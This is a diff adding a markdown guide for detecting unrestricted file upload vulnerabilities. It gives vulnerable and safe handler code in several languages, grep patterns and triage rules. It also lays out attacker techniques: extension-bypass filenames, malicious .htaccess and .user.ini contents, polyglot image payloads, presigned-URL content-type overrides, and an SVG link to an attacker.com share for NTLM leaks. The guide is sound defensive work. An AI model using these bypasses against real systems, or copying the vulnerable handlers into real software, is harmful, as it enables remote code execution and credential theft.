@@ -1,0 +1,550 @@
+---
+name: arbitrary_file_upload
+version: "0.4"
+description: Detect unrestricted file upload vulnerabilities where attackers can upload executable files leading to Remote Code Execution or path traversal, and post-upload media/variant pipelines that process untrusted image bytes through unsafe default loaders.
+---
+
+# Unrestricted File Upload
+
+When an application allows users to upload files without restricting executable types, an attacker can deposit a server-side script (e.g., `.php`, `.py`, `.sh`) into a web-accessible directory and trigger it via an HTTP request to achieve Remote Code Execution. A secondary risk is path traversal through attacker-controlled filenames.
+
+The core pattern: *a user-supplied file reaches a storage location without adequate extension validation, and the stored file is accessible or executable.*
+
+## Class Boundaries
+
+### What it IS
+
+- No extension or content check: `file.save(upload_path)` with no validation
+- Content-Type-only validation — trivially bypassed by setting the header manually
+- Extension blocklist with gaps: `.php` blocked but `.php3`, `.phtml`, `.phar`, `.shtml` not
+- Case-insensitive bypass: blocking `.php` but allowing `.PHP`, `.Php`
+- Double extension: `shell.php.jpg` — last-segment extraction may pass allowlist while Apache executes as PHP
+- **Trailing-dot / trailing-space / OS-normalization bypass**: `shell.php.`, `shell.php` + trailing space, `shell.php%20`, `shell.php.....`, or Windows NTFS ADS `shell.php::$DATA` — the extension check sees `.` / space / `::$DATA` as the "extension" (or the last segment) and passes, but the OS/web-server **strips** the trailing dot(s)/space or the `::$DATA` suffix when writing/serving, leaving an executable `shell.php`. Same class: a trailing Unicode dot or a `.` that `rsplit('.',1)` treats as an empty extension. Flag any extension check that runs on the raw filename without first trimming trailing dots/spaces and rejecting `::$DATA`/control chars, then writing under a **server-generated** name
+- Path traversal in filenames: `../../webroot/shell.php` via unsanitized `file.filename` (also overlaps `path_traversal`)
+- Incomplete sanitization: stripping `../` but not `%2e%2e%2f`
+- Uploads stored in a web-executable directory (`static/uploads/`, `public/`, `wwwroot/`)
+
+### What it is NOT (commonly confused with)
+
+- **Stored XSS via SVG/HTML** — embedded `<script>` in an uploaded SVG reflected back; sink is output encoding, not server-side execution
+- **SSRF/XXE via file content** — uploaded XML/SVG triggering outbound requests; separate class
+- **DoS via large files** — missing size limits; availability issue, not execution
+- **IDOR on download** — accessing another user's file without authorization
+- **Path traversal alone** — reading/writing files outside intended dirs without an upload execution chain; tag `path_traversal` when no web-shell deposit is possible
+- **Secure uploads** — outside webroot, UUID rename, allowlist, served via `Content-Disposition: attachment` download endpoint
+
+## Vulnerable Conditions
+
+Both conditions must hold:
+1. **No extension whitelist** (or only MIME/Content-Type check, which is bypassable).
+2. **Upload directory is web-accessible** (or code executes the uploaded file).
+
+## Safe Patterns
+
+When these appear together, the site is likely **not vulnerable**:
+
+- **Extension allowlist** (most important): `ext = filename.rsplit('.', 1)[-1].lower()` then check against `{'png','jpg','jpeg','gif','pdf'}`
+- **Magic-byte / content validation** (defense in depth): read first 2 KB and verify MIME via `magic.from_buffer()` or equivalent — does not replace allowlist
+- **Image re-encoding** (webshell/polyglot strip only): decode and re-encode through a **hardened** processor to strip embedded script/polyglot payloads. Re-encode does **not** clear AFR/RCE when the same library still runs untrusted/unfuzzed loaders, delegates, or remote schemes on the upload — treat that as the *Post-Upload Media Processing Chain* sink below, not a Safe Pattern
+- **Filename sanitization**: `secure_filename()`, `basename()`, `Path.GetFileName()`, `filepath.Base()` — strips path separators
+- **Server-generated name**: `stored = f"{uuid4()}.jpg"` — extension server-controlled, not user-controlled
+- **Storage outside webroot**: `/var/uploads/` not served by the web server; never `static/`, `public/`, `wwwroot/`
+- **Controlled download endpoint**: `send_from_directory(..., as_attachment=True)` or `Content-Disposition: attachment` — prevents in-browser execution
+
+## Recon Indicators
+
+Grep for receive-and-store chains; trace whether validation exists and where the file lands.
+
+**Upload receive patterns (find all sites first)**
+
+| Stack | Grep targets |
+|-------|-------------|
+| Python/Flask | `request\.files`, `file\.save\(`, `FileStorage` |
+| Python/Django | `request\.FILES`, `InMemoryUploadedFile`, `TemporaryUploadedFile`, `default_storage\.save`, `FileField`, `ImageField` |
+| Node.js | `multer\(`, `upload\.(single\|array\|fields)`, `formidable`, `busboy`, `multiparty`, `req\.files`, `express-fileupload` |
+| PHP | `\$_FILES`, `move_uploaded_file\(`, `copy\(\$_FILES` |
+| Java/Spring | `MultipartFile`, `CommonsMultipartFile`, `StandardMultipartFile`, `file\.transferTo\(`, `Part\.write\(`, `Files\.write\(.*getBytes` (partial guard: `StringUtils.cleanPath(file.getOriginalFilename())` strips traversal but NOT a dangerous extension — still needs an allowlist) |
+| Ruby | `CarrierWave`, `mount_uploader`, `has_one_attached`, `Shrine` (`include Shrine::Attachment`), `params\[.*\]\[:file\]` |
+| Go | `FormFile\(`, `MultipartForm\.File`, `io\.Copy\(.*header\.Filename` |
+| Ruby/Rails | `params\[:file\]`, `has_one_attached`, `mount_uploader`, `CarrierWave` |
+| C#/ASP.NET | `IFormFile`, `CopyToAsync\(`, `HttpPostedFileBase`, `Request\.Files` |
+
+**Dangerous sink chain (flag when present)**
+
+1. User-controlled filename or extension reaches a path join: `os.path.join(UPLOAD, file.filename)`, `Paths.get("uploads/" + file.getOriginalFilename())`, `move_uploaded_file(..., 'uploads/' . $_FILES['file']['name'])`
+2. Storage under web-served or executable dirs: `static/uploads/`, `public/uploads/`, `wwwroot/`, `getServletContext().getRealPath("/")`, `Rails.root.join('public', 'uploads')`
+3. No allowlist visible before save — or only `content_type` / `mimetype` / `$_FILES['type']` checked
+
+**Safe chain (lower priority)**
+
+- Allowlist + `.lower()` on extension + UUID rename + path outside webroot
+
+---
+
+## Python Source Detection Rules
+
+### Flask
+- **VULN**: `file.save(os.path.join(UPLOAD_FOLDER, file.filename))` — no extension check, uses original filename
+- **VULN**: Only MIME check (bypassable): `if 'image' in file.content_type: file.save(...)`
+- **VULN**: `file.filename` used directly without `secure_filename()` — path traversal risk
+- **VULN**: `os.path.join(UPLOAD_FOLDER, request.form['filename'])` — filename from form field
+- **SAFE**: Extension whitelist enforced:
+  ```python
+  ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif'}
+  def allowed_file(filename):
+      return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+  ```
+- **SAFE**: `werkzeug.utils.secure_filename(file.filename)` + extension whitelist check
+
+### Django
+- **VULN**: `InMemoryUploadedFile` saved with original name and no extension validation
+- **VULN**: `FileField` with no `validate_image` or custom validator
+
+### Path traversal in filename
+- **VULN**: `../../../etc/cron.d/evil` as filename accepted without sanitization
+- **Pattern**: `file.filename` used directly in `os.path.join` without `secure_filename`
+
+---
+
+## JavaScript Source Detection Rules
+
+### Multer (Node.js)
+- **VULN**: `multer({ dest: 'uploads/' })` with no `fileFilter` — accepts any file type
+- **VULN**: `fileFilter` only checks `mimetype` (client-supplied, bypassable):
+  ```js
+  fileFilter: (req, file, cb) => {
+      cb(null, file.mimetype.startsWith('image/'));
+  }
+  ```
+- **VULN**: `multer({ storage: diskStorage({ filename: (req, file, cb) => cb(null, file.originalname) }) })` — original name used, path traversal possible
+- **SAFE**: Extension whitelist in fileFilter:
+  ```js
+  const ALLOWED = ['.jpg', '.png', '.gif'];
+  const ext = path.extname(file.originalname).toLowerCase();
+  cb(null, ALLOWED.includes(ext));
+  ```
+
+### Formidable / busboy
+- **VULN**: File saved with original name without extension validation
+- **VULN**: Upload path constructed from user-controlled filename segment
+
+---
+
+## Go Source Detection Rules
+
+```go
+// VULNERABLE: no extension check, stored in static directory
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+    file, header, _ := r.FormFile("file")
+    defer file.Close()
+    dst, _ := os.Create("static/uploads/" + header.Filename)
+    io.Copy(dst, file)
+}
+
+// SECURE: allowlist + UUID rename + outside web root
+var allowed = map[string]bool{"jpg": true, "jpeg": true, "png": true, "gif": true}
+
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+    file, header, _ := r.FormFile("file")
+    defer file.Close()
+    ext := strings.ToLower(filepath.Ext(header.Filename))
+    if ext == "" || !allowed[ext[1:]] {
+        http.Error(w, "invalid extension", http.StatusBadRequest)
+        return
+    }
+    stored := "/var/uploads/" + uuid.New().String() + ext
+    dst, _ := os.Create(stored)
+    io.Copy(dst, file)
+}
+```
+
+---
+
+## Ruby / Rails Source Detection Rules
+
+```ruby
+# VULNERABLE: no validation, stored in public/
+def upload
+  file = params[:file]
+  File.open(Rails.root.join('public', 'uploads', file.original_filename), 'wb') do |f|
+    f.write(file.read)
+  end
+end
+
+# SECURE: CarrierWave with extension allowlist
+class AvatarUploader < CarrierWave::Uploader::Base
+  def extension_allowlist
+    %w[jpg jpeg png gif]
+  end
+end
+# Note: ActiveStorage content_type is user-supplied in some configs — validate extension too
+```
+
+---
+
+## PHP Source Detection Rules
+
+### Basic upload
+- **VULN**: `move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $_FILES['file']['name'])` — original name, no validation
+- **VULN**: Only MIME type check: `if ($_FILES['file']['type'] == 'image/jpeg')` — easily spoofed
+- **VULN**: Extension check via `$_FILES['file']['type']` (client-supplied Content-Type)
+
+### Extension-based checks
+- **VULN**: Blacklist approach — blocks `.php` but misses `.php5`, `.phtml`, `.phar`:
+  ```php
+  if (pathinfo($filename, PATHINFO_EXTENSION) != 'php') { /* allow */ }
+  ```
+- **SAFE**: Whitelist approach:
+  ```php
+  $allowed = ['jpg', 'jpeg', 'png', 'gif'];
+  $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+  if (!in_array($ext, $allowed)) { die('Invalid file type'); }
+  ```
+
+### Path traversal
+- **VULN**: `$uploadDir . $_FILES['file']['name']` — filename could contain `../`
+- **SAFE**: `basename($_FILES['file']['name'])` — strips directory components
+
+### Dangerous extensions to flag
+
+**Server-side scripts**: `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.py`, `.rb`, `.pl`, `.sh`, `.cgi`, `.asp`, `.aspx`, `.asa`, `.cer`, `.jsp`, `.jspx`, `.jspf`, `.jsw`, `.jsv`
+
+**Apache config override**: `.htaccess` (AddHandler/AddType), `.user.ini` (`auto_prepend_file` / `auto_append_file` on PHP-FPM/CGI)
+
+**IIS handler/config**: `.asa`, `.asax`, `.cer`, `.cdx`, `.config` (`web.config`), `.ashx`, `.asmx`
+
+## Java / Spring Source Detection Rules
+
+```java
+// VULNERABLE: Spring MultipartFile with no extension validation
+@PostMapping("/upload")
+public ResponseEntity<?> upload(@RequestParam("file") MultipartFile file) {
+    String filename = file.getOriginalFilename();
+    Path dest = Paths.get(UPLOAD_DIR).resolve(filename);  // no extension check, path traversal possible
+    file.transferTo(dest.toFile());
+}
+// Risk: upload .jsp → deploy to webroot → RCE if directory is served by Tomcat
+
+// VULNERABLE: only MIME/Content-Type check (client-controlled)
+if (file.getContentType().startsWith("image/")) {
+    file.transferTo(new File(UPLOAD_DIR + filename));  // MIME easily spoofed
+}
+
+// VULNERABLE: no content-type validation at all
+@PostMapping("/avatar")
+public String uploadAvatar(@RequestParam MultipartFile avatar, Principal principal) {
+    String path = AVATAR_DIR + principal.getName() + "_" + avatar.getOriginalFilename();
+    avatar.transferTo(new File(path));  // .jsp / .jspx → RCE if within webroot
+}
+
+// SAFE: extension whitelist + randomized filename
+private static final Set<String> ALLOWED = Set.of("jpg","jpeg","png","gif","pdf");
+String ext = StringUtils.getFilenameExtension(file.getOriginalFilename()).toLowerCase();
+if (!ALLOWED.contains(ext)) throw new IllegalArgumentException("Invalid file type");
+String safeFilename = UUID.randomUUID() + "." + ext;
+file.transferTo(Paths.get(UPLOAD_DIR, safeFilename).toFile());
+```
+
+### JSP/JSPX Upload → RCE Chain
+
+**VULN condition**:
+1. Application accepts `.jsp`, `.jspx`, or no extension filter
+2. Upload directory is within Tomcat/Jetty webroot OR accessible via URL
+3. Uploaded file served/executed by the servlet container
+
+```java
+// HIGH RISK: upload dir inside webroot
+String UPLOAD_DIR = request.getServletContext().getRealPath("/uploads/");
+// Any .jsp uploaded here is executable via HTTP request
+```
+
+### WAR/JAR Auto-Deploy
+
+```java
+// VULNERABLE: user can upload to Tomcat autodeploy directory
+String deployPath = System.getProperty("catalina.home") + "/webapps/" + file.getOriginalFilename();
+file.transferTo(new File(deployPath));
+// .war file uploaded → Tomcat auto-deploys it → RCE
+
+// VULNERABLE: ZIP extraction to webroot (Zip Slip → JSP drop)
+ZipInputStream zis = new ZipInputStream(file.getInputStream());
+ZipEntry entry;
+while ((entry = zis.getNextEntry()) != null) {
+    String entryPath = WEBROOT + entry.getName();  // no canonicalization → ../webapps/ROOT/shell.jsp
+    // write to entryPath
+}
+```
+
+## PHP Extension Bypass Patterns
+
+### Double Extension and Alternative PHP Extensions
+
+```php
+// VULNERABLE: blacklist missing alternative PHP extensions
+$blacklist = ['php'];
+$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
+if (!in_array($ext, $blacklist)) {
+    move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . $_FILES['file']['name']);
+}
+// Bypasses: .php5, .php7, .phtml, .phar, .PHP (case bypass if no strtolower), .php.jpg (Apache AddHandler)
+
+// Executable extensions in Apache/Nginx context:
+// .php, .php3, .php4, .php5, .php7, .phtml, .phar
+// .asp, .aspx, .asa, .ashx (IIS)
+// .jsp, .jspx, .jspf (Java EE)
+// .pl, .cgi (Perl/CGI)
+
+// SAFE: whitelist approach
+$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'docx'];
+$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed, true)) { die('Rejected'); }
+```
+
+### .htaccess / .user.ini Upload → RCE
+
+```php
+// VULNERABLE: allows .htaccess file upload in Apache environments
+// Attacker uploads .htaccess containing:
+//   AddType application/x-httpd-php .jpg
+// Then any .jpg file in that directory is executed as PHP
+
+// VULNERABLE: .user.ini upload on PHP-FPM/CGI (per-directory INI override)
+// Attacker uploads .user.ini containing:
+//   auto_prepend_file=evil.jpg
+// Then any request in that directory prepends/executes evil.jpg as PHP
+
+// VULN indicator: .htaccess / .user.ini not in the blocked extensions list
+$blocked = ['php', 'exe', 'sh'];  // Missing .htaccess, .user.ini → bypass
+```
+
+## ASP.NET / IIS Source Detection Rules
+
+```csharp
+// VULNERABLE: no extension validation in ASP.NET upload
+[HttpPost]
+public IActionResult Upload(IFormFile file) {
+    var path = Path.Combine(uploadDir, file.FileName);  // .aspx, .ashx, .config upload possible
+    using var stream = System.IO.File.Create(path);
+    file.CopyTo(stream);
+    return Ok();
+}
+
+// VULNERABLE: only MIME type check
+if (file.ContentType.StartsWith("image/")) { /* save file */ }
+// ContentType is client-controlled header — easily spoofed
+
+// DANGEROUS: .aspx upload → IIS executes as ASP.NET handler
+// DANGEROUS: web.config upload → overrides application config (potential auth bypass / RCE)
+
+// SAFE: extension whitelist + randomized name + store outside webroot
+var allowedExt = new HashSet<string> { ".jpg", ".jpeg", ".png", ".gif", ".pdf" };
+var ext = Path.GetExtension(file.FileName).ToLowerInvariant();
+if (!allowedExt.Contains(ext)) return BadRequest("Invalid file type");
+var safeName = Guid.NewGuid() + ext;
+var uploadPath = Path.Combine(storageDir, safeName);  // storageDir outside wwwroot
+```
+
+### ASP.NET Dangerous Extensions
+
+`.aspx`, `.ascx`, `.ashx`, `.asmx`, `.asax`, `.cer`, `.cdx`, `.config` (`web.config`), `.cs`, `.vb`
+
+A blacklist missing any of these allows IIS handler execution.
+
+## Java TRUE POSITIVE Rules
+
+- `MultipartFile.transferTo(new File(UPLOAD_DIR + file.getOriginalFilename()))` with no extension check → **CONFIRM** (arbitrary file write, potential RCE if JSP)
+- Upload directory within `getServletContext().getRealPath("/")` or webroot subdirectory + no extension filter → **CONFIRM** (JSP execution risk)
+- `ZipInputStream` extraction with entry path not canonicalized → **CONFIRM** (Zip Slip)
+- WAR/JAR extraction to Tomcat `webapps/` directory → **CONFIRM** (auto-deploy RCE)
+- If code derives `suffix` from `file.getOriginalFilename()`, saves with `transferTo(...)`, and the same project exposes that directory through `/file/**`, `ResourceHandlerRegistry`, a `file:` static mapping, or a returned public URL, CONFIRM `arbitrary_file_upload` even when the stored filename is timestamp-randomized.
+
+## Java FALSE POSITIVE Rules
+
+- Extension whitelist enforced + filename randomized + stored outside webroot → **SAFE**
+- Files stored in object storage (S3, GCS) never served directly by the app server → lower risk (no server-side execution, but content-type sniffing risk remains)
+- Content served through a download endpoint that sets `Content-Disposition: attachment` → reduces XSS risk but not server-side execution risk
+- FALSE POSITIVE guard (classic webshell deposit only): profile-image upload is not `arbitrary_file_upload` unless attacker-controlled file type, path, or execution context can escape image-only constraints or reach a web-executable location. This guard does **not** clear a reachable **variant / resize / thumbnail / convert** pipeline on those same bytes — report that under the media-processing chain (`rce` / `path_traversal` / `ssrf`).
+
+## Additional FALSE POSITIVE Rules
+
+- Do NOT emit **classic** `arbitrary_file_upload` (webshell-to-webroot) for profile image/avatar endpoints that restrict to image types (jpg/png/gif/webp) AND store files outside the webroot or in object storage. **Still** trace `variant` / `resize` / `thumbnail` / `sharp` / `libvips` / `MiniMagick` / `convert` / Active Storage representations — MIME allowlist + non-webroot do **not** discharge unsafe default loaders on untrusted image bytes.
+- Do NOT emit when file type validation (extension whitelist + content-type check + magic byte validation) is present, even if not perfect — flag as LIKELY only if a specific bypass is demonstrable. (Does not apply to media-processor untrusted-ops findings.)
+- Do NOT emit for file write operations that are not uploads (e.g., logging, temp files, cache writes) — these should be tagged as `path_traversal` if applicable.
+
+## Polyglot / Magic-Byte-Only Validation
+
+**VULN condition**: extension allowlist passes, but validation stops at Content-Type header or magic-byte sniff (`magic.from_buffer`, `filetype.guess`, `getimagesize`) with no decode-and-re-encode step. Attacker embeds executable payload in metadata/comments/polyglot structure while preserving valid leading bytes (e.g., JPEG SOI + PHP in EXIF comment, GIF header + script in trailer).
+
+```python
+# VULN: magic-byte check only — embedded script survives
+header = file.read(2048)
+if header.startswith(b'\xff\xd8\xff'):  # looks like JPEG
+    file.save(path)  # PHP in EXIF/comment still present
+
+# SAFE: re-encode strips non-image payload (defense in depth — still require allowlist)
+from PIL import Image
+img = Image.open(file)
+img.save(path, format='JPEG')  # drops foreign bytes/comments
+```
+
+**Caveat — re-encoding is NOT a guaranteed strip; a payload in the *pixel/compressed data* can survive transformation.** Decode-and-re-encode reliably removes metadata (EXIF/APPn markers) and **trailing** bytes (after `0xFFD9`/`IEND`/GIF trailer) — but bytes smuggled into the **image content itself** are copied through lossy transforms. Two durable placements: (1) **JPG entropy-coded segment (ECS)** — the Huffman-compressed MCU stream; with trial-and-error tuning (choosing quality factors that match the server's output, separating payload bytes with survivable patterns, and avoiding low-value bytes the parser drops) an attacker can leave a `<script>`/`onclick`/`onmouseover` string intact *after* the server's own resize/re-encode. (2) **PNG `iDAT` pixel chunks** — payload encoded into pixel data survives resize/resampling. So "we re-encode/resize every upload" **raises the bar but does not by itself neutralize an XSS payload** when the file is later served with a sniffable or executable Content-Type from an in-scope origin. Do not downgrade an image-upload XSS finding merely because a re-encode step exists. The reliable controls are the serve-time ones: an **isolated (sandbox) origin**, a forced **non-executable** stored `Content-Type` + `X-Content-Type-Options: nosniff`, and `Content-Disposition: attachment` (see the caveat below on its limits) — not the transform.
+
+**Grep seeds**: `magic\.from_buffer`, `getimagesize`, `filetype\.guess`, `mimetype`/`content_type` check with no `Image\.open.*save` / `sharp\(` / `convert` re-encode downstream; and — for the caveat — a re-encode/resize step (`Image\.open.*save`, `sharp\(`, `convert`, `libvips`) relied on as the *only* XSS control while the file is served same-origin with a sniffable/executable type.
+
+### Shallow sniff: detectors read only a handful of bytes
+
+Type-sniff libraries are fast because they read *as little as possible*, so the "valid leading bytes" the attacker must preserve are often tiny — and bytes the sniffer never looks at are fully attacker-controlled. Example: the common Node `file-type` library identifies ISO-BMFF media (HEIC/AVIF/MP4/MOV) by checking only `ftyp` at offset 4 and a 4-byte brand at offset 8 — it **never validates the 4-byte box-size field at offset 0**. Those free bytes plus the unconstrained tail let one buffer be `image/heic` to the sniff **and** valid JavaScript/HTML/CSS/JSON/SVG to a consumer (e.g. open a `/*` JS block-comment or `<!--` HTML-comment over the magic, then append the real payload after a closing `*/`/`-->`). A passing content sniff is **necessary but not sufficient**; only a full decode-and-re-encode (or rejecting non-re-encodable input) actually proves the bytes are an image.
+
+### Verify-type vs serve-type consistency gap (the real defect)
+
+A polyglot only becomes exploitable when the type decided at **upload** (from bytes) drifts from the `Content-Type` chosen at **download**. The dangerous shape: the server sniffs bytes on upload but then derives the response `Content-Type` from the **filename extension** (or a stored client-supplied field) at serve time — so the same bytes verified as `image/heic` get served as `application/javascript`, `text/html`, `application/json`, or `image/svg+xml` depending on the extension the attacker registered, landing in a script / HTML / trusted-API / stylesheet sink.
+
+**Object-storage `response-content-*` override (served type is attacker-influenced with no upload flaw at all).** Cloud object stores let the *requester* override the served response headers via query parameters: S3/GCS `response-content-type` & `response-content-disposition` (presigned URLs carry these as `ResponseContentType`/`ResponseContentDisposition`), Azure Blob SAS `rsct`/`rscd`. If public objects — or presigned URLs that don't **pin** these params — are reachable, an attacker appends `?response-content-type=text/html&response-content-disposition=inline` to a *correctly-stored, correctly-typed* object and it renders as HTML on the storage origin → stored XSS, bypassing every upload-time content-type/extension/magic-byte check because the override happens at *serve* time. Aggravated when the bucket shares the app's origin or cookie scope. **SAST signals**: user-reachable bucket objects with no `X-Content-Type-Options: nosniff` and no forced `Content-Disposition: attachment`; presigned-URL signing that omits a pinned `ResponseContentType`/`ResponseContentDisposition`; a storage bucket served from an in-scope app origin. **SAFE**: serve user content from an isolated origin, force `Content-Disposition: attachment` + `nosniff`, and pin (or forbid) the `response-content-*` params when signing URLs.
+
+**S3's anonymous-override rejection is NOT a mitigation — the attacker re-signs the public object with their *own* AWS account.** AWS S3 *refuses* `response-content-*` overrides on **anonymous** GETs (`400 InvalidRequest` — "Request specific response headers cannot be used for anonymous GET requests"), so `GET …/<key>?response-content-type=text/html` fails unsigned. MinIO and many S3-compatible stores honor the override anonymously and are done in one request; **do not treat the S3 error as a fix or downgrade the finding because of it.** A publicly-readable object is readable by **any** AWS principal, so the attacker signs a `GetObject` with **their own credentials** and bakes the override into a **presigned URL** — `boto3` `generate_presigned_url("get_object", Params={"Bucket":b,"Key":k,"ResponseContentType":"text/html"})` — signing against the object's in-scope host (`endpoint_url=https://cdn.target.com`) so the returned HTML renders in the **victim origin**. The presigned link carries a valid signature, needs no victim credentials, and serves the stored bytes as attacker-chosen `text/html`. (Bucket/region unknown? A deliberately mis-signed request returns `SignatureDoesNotMatch` whose `<CanonicalRequest>` echoes the real bucket host + region — plug them back in and re-sign.) **Triage rule**: never DOWNGRADE a public-object `response-content-*` stored-XSS finding on the grounds that "S3 blocks anonymous overrides" — the presigned re-sign path defeats that whenever the object is anonymously readable; the durable controls are still the serve-time ones (isolated origin, non-executable pinned type + `nosniff`).
+
+**Caveat — `Content-Disposition: attachment` is NOT sufficient by itself for an executable Content-Type.** The disposition governs **top-level navigation/download** behavior only; it is **ignored for subresource loads**, so a stored file served as `application/javascript` (or `text/html`/`image/svg+xml`) can still be pulled and **executed** via `<script src=…>`, `<link>`, an `<embed>`/`<object>`, or an in-app consumer that content-type-confuses it (e.g. a rich-text/editor component) — the attachment header never fires on those paths. So a reviewer must **not** dismiss a finding merely because `attachment` is set. The reliable controls are: serve user content from an **isolated (sandbox) origin**, force a **non-executable** stored Content-Type (never `application/javascript`/`text/html`) + `nosniff`, and (belt-and-suspenders) a restrictive `Content-Security-Policy` on the serving route. Cross-ref `http_response_splitting.md` (framework helpers re-deriving Content-Type), `xssi_jsonp.md` (cross-origin script inclusion of served content).
+
+```javascript
+// VULN: type verified from bytes on upload, but served from attacker-controlled extension
+const detected = await FileType.fromBuffer(buf);            // sniffs ~12 bytes → image/heic
+if (!detected?.mime?.startsWith('image/')) return res.sendStatus(415);
+const ext = safeExt(req.body.filename);                     // attacker controls extension (.js/.html/.svg)
+// ... later, on download:
+res.setHeader('Content-Type', contentTypeFromName(filename)); // derived from extension, NOT verified bytes
+
+// SAFE: persist the verified type and serve exactly that; never trust extension/form Content-Type
+const detected = await FileType.fromBuffer(buf);
+if (!ALLOWED_IMAGE_MIME.has(detected?.mime)) return res.sendStatus(415);
+const stored = { bytes: reencodeImage(buf), mime: detected.mime }; // re-encode + pin verified mime
+res.setHeader('Content-Type', stored.mime);
+res.setHeader('X-Content-Type-Options', 'nosniff');           // block browser content-sniffing too
+```
+
+**Grep seeds**: `FileType\.fromBuffer|fileTypeFromBuffer|file-type`, response `Content-Type`/`setHeader` derived from `extname`/`path.extname`/`splitext`/filename rather than the persisted detected mime; presence of a sniff at upload but no re-encode and no pinned-mime store; missing `X-Content-Type-Options: nosniff` on user-content responses.
+
+## Null-Byte and Extension Parsing Weaknesses
+
+**VULN patterns** — naive extension extraction from the original filename:
+
+```python
+# VULN: last segment only — shell.php.jpg passes allowlist {'jpg'}
+ext = filename.split('.')[-1].lower()
+
+# VULN: first segment only — shell.jpg.php passes allowlist {'jpg'}
+ext = filename.split('.')[1].lower()
+
+# VULN: null-byte truncation (legacy stacks) — shell.php%00.jpg stored/executed as .php
+name = filename.replace('\x00', '')  # too late if path already built
+```
+
+```php
+// VULN: pathinfo on unsanitized name — file.jpg.php vs file.php.jpg order matters
+$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
+// Bypass: shell.php.jpg (Apache may execute leftmost .php); shell.jpg.php (allowlist sees jpg)
+```
+
+**SAFE**: `rsplit('.', 1)` on basename only; reject filenames containing `%00`, `\x00`, or multiple `.` when policy is single-extension; server-generated stored name; `secure_filename()` / `basename()` before any extension logic.
+
+## Post-Upload Media Processing Chain (SSRF / RCE / LFI)
+
+After save, many apps pass the stored path, blob, or signed URL into image/PDF/video pipelines. The **uploaded bytes** become input to subprocesses or libraries that decode, variant/resize, transcode, or render — a second-stage sink beyond web-shell deposit. Avatars, profile pictures, and thumbnail endpoints are **in scope** for this chain even when classic `arbitrary_file_upload` is correctly skipped.
+
+**VULN condition** (any one is enough with untrusted upload reachability):
+1. User-controlled upload reaches `convert`, `ffmpeg`, ImageMagick, `sharp`, `libvips` / `ruby-vips`, headless screenshot/PDF renderers, or thumbnail workers **without** sandboxing the path and **without** blocking remote schemes in nested fetches.
+2. Framework or library **default** image processors leave **untrusted / unfuzzed / dangerous format loaders** enabled while generating variants (resize, crop, represent). Classic signal: Rails Active Storage `config.active_storage.variant_processor = :vips` (Rails 7+ `load_defaults`) with untrusted image uploads and **no** `Vips.block_untrusted(true)` / `ENV["VIPS_BLOCK_UNTRUSTED"]`. Parallel: ImageMagick/`MiniMagick`/`Wand` without a default-deny `policy.xml` (see `path_traversal_lfi_rfi.md`).
+3. App code or comments treat “we re-encode / variant every upload” as the **only** upload control while the processor still accepts exotic loaders that can read local files or shell out.
+
+| Stack | Grep seeds (trace from `file.save` / `transferTo` / `move_uploaded_file` / `has_one_attached` / `ImageField`) |
+|-------|---------------------------------------------------------------------------|
+| Shell | `convert\s`, `ffmpeg\s`, `magick\s`, `gm convert`, `exiftool\s`, `wkhtmltopdf`, `puppeteer`, `playwright` |
+| Node.js | `sharp\(`, `ffmpeg-static`, `fluent-ffmpeg`, `gm\(`, `jimp\.`, `pdf-lib`, `puppeteer\.launch` |
+| Python | `subprocess.*convert`, `Wand\(`, `ffmpeg\.`, `pdf2image`, `imgkit`, `weasyprint`, `pyvips`, `Vips\.` |
+| Ruby | `has_one_attached`, `has_many_attached`, `\.variant\(`, `resize_to_limit`, `variant_processor`, `Vips::Image`, `Vips\.block_untrusted`, `MiniMagick`, `image_processing` |
+| Java | `ProcessBuilder.*ffmpeg`, `ImageIO\.read`, `Thumbnailator`, `PDFBox`, `GraphicsMagick` |
+
+```javascript
+// VULN: transform attacker-controlled path — unsafe default loaders / delegates
+sharp(uploadedFile.path).resize(200).toFile(thumbPath);
+exec(`ffmpeg -i ${uploadedFile.path} -f mp4 ${outPath}`);
+
+// VULN: URL passed to renderer after upload — nested SSRF (see ssrf.md)
+await page.goto(signedUrlFor(uploadedFile.path));
+```
+
+```ruby
+# VULN: Active Storage variant on untrusted avatar — default :vips, no untrusted-ops block
+avatar.variant(resize_to_limit: [200, 200]).processed
+
+# SAFE (libvips ≥ 8.13 / ruby-vips with block API): deny untrusted ops process-wide
+# initializer: Vips.block_untrusted(true)  — or ENV["VIPS_BLOCK_UNTRUSTED"]=1
+# Plus keep image allowlist; Magick/vips choice alone is not a finding without untrusted uploads
+```
+
+**Impact note**: arbitrary file read via a media loader often yields process environment / framework secrets (`secret_key_base`, cloud keys) → session forgery or lateral movement. Tag `path_traversal` / `information_disclosure` for the read face and `rce` when the chain reaches execution; do not require a public PoC to keep the structural finding.
+
+Tag secondary impact as `ssrf` or RCE when the processing chain invokes network/file handlers on attacker content; cross-ref `ssrf.md` for URL-fetch variants and `rce.md` *Media and Document Pipelines* for libvips / ImageMagick controls.
+
+## SVG Upload — Server-Side Processing (XSS / SSRF / XXE)
+
+SVG is XML. When uploads are stored and **rendered, thumbnailed, sanitized server-side, or inlined** in responses, the file content — not just the extension — matters.
+
+**VULN surfaces**:
+- Inline `<script>`, event handlers (`onload`), `foreignObject` → stored/reflected XSS when SVG served as `image/svg+xml` without CSP; see `xss.md`
+- `xlink:href="http://169.254.169.254/..."` or external `<image href="...">` → SSRF when server-side renderer fetches resources; see `ssrf.md`
+- `xlink:href="file://attacker.com/share/..."` (UNC hostname-form `file://`, not `file:///local/path`) on **Windows** ImageMagick/`convert` → outbound SMB / **NTLMv2** hash leak or relay; see `ssrf.md` **UNC-style `file://hostname/share` → NTLM** — do not file as LFI-only
+- `<!DOCTYPE>` / external entities / XInclude in SVG → XXE when parsed by XML-aware pipelines; see `xxe.md`
+
+```xml
